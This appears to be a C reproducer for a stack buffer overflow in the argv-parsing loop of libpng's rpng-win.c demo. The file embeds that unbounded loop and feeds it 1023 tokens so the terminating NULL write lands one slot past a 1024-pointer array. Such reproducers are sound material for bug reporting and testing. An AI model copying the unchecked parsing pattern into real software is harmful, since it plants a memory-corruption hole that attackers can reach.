#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This reproducer embeds the vulnerable argv-building logic from
 * contrib/gregbook/rpng-win.c:WinMain. It builds a very long, space-
 * separated command line so that argc reaches 1024, and then the
 * terminating write argv[argc] = NULL overflows a fixed-size
 * stack array of 1024 pointers. */

#define PROGNAME "rpng-win"

static void vulnerable_winmain_like(char *cmd)
{
    /* Minimal surrounding state to mirror the original context */
    double LUT_exponent = 1.0;
    double CRT_exponent = 1.0;
    double default_display_exponent = LUT_exponent * CRT_exponent;
    double display_exponent = default_display_exponent;
    (void)display_exponent; /* suppress unused warning */

    /* Vulnerable argv array and parsing routine */
    char *argv[1024];
    int argc = 0;
    char *p, *q;

    argv[argc++] = (char*)PROGNAME;   /* argv[0] */
    p = cmd;
    for (;;) {
        if (*p == ' ')
            while (*++p == ' ')
                ;
        if (*p == '\0')
            break;    /* nothing after the spaces: done */
        argv[argc++] = q = p;              /* POTENTIAL OVERFLOW (no bounds check) */
        while (*q && *q != ' ')
            ++q;
        if (*q == '\0')
            break;    /* last argv already terminated; quit */
        *q = '\0';    /* change space to terminator */
        p = q + 1;
    }
    argv[argc] = NULL;   /* terminate the argv array itself (OVERFLOW when argc == 1024) */
}

int main(void)
{
    /* We need exactly 1023 tokens after PROGNAME so that:
     *  - the last token occupies argv[1023]
     *  - argc becomes 1024
     *  - the terminating write argv[1024] = NULL overflows the 1024-element array
     */
    const int tokens = 1023; /* number of space-separated tokens */

    /* Build a writable command line string: "a a a ... a" (1023 times) */
    size_t bufsize = (size_t)tokens * 2; /* worst-case: 'a' + space per token; exact size is 2*tokens-1 + NUL */
    char *cmd = (char *)malloc(bufsize + 1);
    if (!cmd) {
        perror("malloc");
        return 1;
    }

    size_t pos = 0;
    for (int i = 0; i < tokens; ++i) {
        cmd[pos++] = 'a';
        if (i != tokens - 1)
            cmd[pos++] = ' ';
    }
    cmd[pos] = '\0';

    /* Trigger the vulnerable logic */
    vulnerable_winmain_like(cmd);

    free(cmd);
    return 0;
}
